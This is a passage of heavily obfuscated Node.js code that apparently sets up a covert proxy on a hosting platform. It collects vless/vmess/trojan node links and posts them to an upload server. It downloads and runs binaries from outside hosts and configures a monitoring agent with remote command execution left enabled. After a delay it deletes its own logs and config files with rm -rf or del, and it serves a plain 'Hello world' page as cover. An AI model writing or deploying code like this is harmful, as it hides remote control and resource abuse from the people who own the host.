_0x47c14c=fs[_0x1e5a56(0x175)](listPath,'utf-8'),_0x48dd28=_0x47c14c[_0x1e5a56(_0x1e7462._0x4b8037)]('\x0a')[_0x1e5a56(_0x1e7462._0x39307b)](_0x44a8f1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1e5a56(0x11f)](_0x44a8f1));if(_0x48dd28[_0x1e5a56(_0x1e7462._0x1b96fc)]===0x0)return;const _0x4570f1=JSON['stringify']({'nodes':_0x48dd28});try{const _0x2c46bf=await axios['post'](UPLOAD_URL+_0x1e5a56(_0x1e7462._0x2d607f),_0x4570f1,{'headers':{'Content-Type':'application/json'}});return _0x2c46bf&&_0x2c46bf[_0x1e5a56(0x1c5)]===0xc8?(console[_0x1e5a56(0x142)](_0x1e5a56(_0x1e7462._0x3e53f9)),_0x2c46bf):null;}catch(_0x3772e8){return null;}}else return;}}function cleanFiles(){const _0x1a4699={_0x4c0d70:0x121,_0x1d3a06:0x177,_0x4c47db:0x113},_0x535929={_0x228a32:0x189,_0x5d707b:0x142};setTimeout(()=>{const _0x248e7d=_0x5f42,_0x4bb26a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4bb26a[_0x248e7d(_0x1a4699._0x4c0d70)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4bb26a['push'](phpPath);process[_0x248e7d(0x166)]===_0x248e7d(_0x1a4699._0x1d3a06)?exec(_0x248e7d(_0x1a4699._0x4c47db)+_0x4bb26a['join']('\x20')+'\x20>\x20nul\x202>&1',_0xda2c0f=>{const _0x4573a4=_0x248e7d;console[_0x4573a4(_0x535929._0x228a32)](),console[_0x4573a4(0x142)](_0x4573a4(0x119)),console[_0x4573a4(_0x535929._0x5d707b)](_0x4573a4(0x1c4));}):exec('rm\x20-rf\x20'+_0x4bb26a[_0x248e7d(0x12f)]('\x20')+_0x248e7d(0x160),_0x160def=>{const _0x437d6d=_0x248e7d;console[_0x437d6d(0x189)](),console[_0x437d6d(0x142)]('App\x20is\x20running'),console[_0x437d6d(0x142)](_0x437d6d(0x1c4));});},0x15f90);}cleanFiles();function _0x30e9(){const _0x2c0cd0=['ARGO_DOMAIN:','saas.sin.fan','Error\x20in\x20startserver:','\x0aclient_secret:\x20','https://arm64.ssss.nyc.mn/web','ArgoDomain:','quic','application/json','101828dnJJuk','path','express','NAME','freedom','send','charAt','https://amd64.ssss.nyc.mn/web','9HPUAZO','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','filter','/vmess-argo','/tunnel.yml\x20run','taskkill\x20/f\x20/im\x20','forEach','2083','12303788EfrusV','writeFileSync','Error\x20executing\x20command:\x20','stringify','nohup\x20','unlinkSync','toString','\x0avless://','close','/vmess-argo?ed=2560','Mozilla/5.0','Download\x20','vmess','https://oooo.serv00.net/add-url','statSync','http://ip-api.com/json','/sub.txt\x20saved\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','status','countryCode','php\x20running\x20error:\x20','\x20already\x20exists','existsSync','Nodes\x20uploaded\x20successfully','get','arch','?encryption=none&security=tls&sni=','13mZMXXR','pkill\x20-f\x20\x22[','npm\x20running\x20error:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','del\x20/f\x20/q\x20','boot.log','ARGO_AUTH','Subscription\x20uploaded\x20successfully','http','452gysiqP','App\x20is\x20running','list.txt','stream','NEZHA_SERVER','readFile','\x22\x20>\x20/dev/null\x202>&1','test','8443','push','arm','data','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','FILE_PATH','true','chmod','171208ceuKgA','25845RctaBX','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','/dev/null','finish','http\x20server\x20is\x20running\x20on\x20port:','join','utf-8','2096','unshift','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','substring','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub.txt','UPLOAD_URL','post','CFIP','/api/add-subscriptions','tcp','/api/delete-nodes','https://arm64.ssss.nyc.mn/v1','xtls-rprx-vision','https+local://8.8.8.8/dns-query','unlink','843070vZAzhC','log','/config.json\x20>/dev/null\x202>&1\x20&','\x20is\x20running','2cFMpEw','&path=%2Fvless-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1\x20&','vless','isFile','\x20failed:\x20','Unhandled\x20error\x20in\x20startserver:','block','1329NEbrLp','ARGO_DOMAIN','258OnapyA','112XtVgoC','base64','response','312264McSlpQ','all','message','\x20-c\x20','127.0.0.1','\x0a\x0avmess://','then','mkdirSync','auto','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','replace','split','match','\x20>/dev/null\x202>&1','.exe\x20>\x20nul\x202>&1','/vless-argo','NEZHA_PORT','2053','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','platform','abcdefghijklmnopqrstuvwxyz','direct','random','SERVER_PORT','\x20successfully','none','floor','&path=%2Ftrojan-argo%3Fed%3D2560#','https://api.ip.sb/geoip','child_process','PROJECT_URL','country_code','utf8','has','readFileSync','from','win32','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20credentials-file:\x20','/api/add-nodes','tunnel.yml','tls','443','--tls','includes','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','isp','2087','Unknown','error','blackhole','Error\x20downloading\x20files:','config.json','NEZHA_KEY','clear','axios','web\x20running\x20error:\x20','\x20-p\x20','org','length','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','&fp=firefox&type=ws&host=','config.yaml','catch','AUTO_ACCESS','railway.231913.xyz','map','154dUIaPA','c1fc9170-2c34-4491-8027-b811e3a794a7','CFPORT','firefox','env'];_0x30e9=function(){return _0x2c0cd0;};return _0x30e9();}async function AddVisitTask(){const _0x3fa24f={_0x45edb3:0x138,_0x9a480:0x1a2,_0x1cc8d4:0x178},_0x389c79=_0x1bd688;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x27412b=await axios[_0x389c79(_0x3fa24f._0x45edb3)](_0x389c79(0x1c0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x389c79(_0x3fa24f._0x9a480)}});return console[_0x389c79(0x142)]('automatic\x20access\x20task\x20added\x20successfully'),_0x27412b;}catch(_0x16aa3c){return console[_0x389c79(0x184)](_0x389c79(_0x3fa24f._0x1cc8d4)+_0x16aa3c[_0x389c79(0x155)]),null;}}async function startserver(){const _0x384104={_0x4f82b2:0x19d},_0x523207=_0x1bd688;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x71ce6e){console[_0x523207(0x184)](_0x523207(_0x384104._0x4f82b2),_0x71ce6e);}}startserver()[_0x1bd688(0x192)](_0x171bee=>{const _0x555040={_0x1d1cba:0x184,_0xf258cc:0x14b},_0x5380da=_0x1bd688;console[_0x5380da(_0x555040._0x1d1cba)](_0x5380da(_0x555040._0xf258cc),_0x171bee);}),app['get']('/',async function(_0x4cfe9f,_0x323d66){const _0x370065={_0x45fa91:0x12f,_0x2df3d7:0x11d,_0x1162d3:0x173,_0xef0902:0x1a8,_0x2c0553:0x1a8,_0xf481c5:0x12b},_0x2b77c7=_0x1bd688;try{const _0x12e370=path[_0x2b77c7(_0x370065._0x45fa91)](__dirname,'index.html'),_0xd4e9f1=await fs['promises'][_0x2b77c7(_0x370065._0x2df3d7)](_0x12e370,_0x2b77c7(_0x370065._0x1162d3));_0x323d66[_0x2b77c7(_0x370065._0xef0902)](_0xd4e9f1);}catch(_0x58f30d){_0x323d66[_0x2b77c7(_0x370065._0x2c0553)](_0x2b77c7(_0x370065._0xf481c5));}}),app['listen'](PORT,()=>console[_0x1bd688(0x142)](_0x1bd688(0x12e)+PORT+'!'));

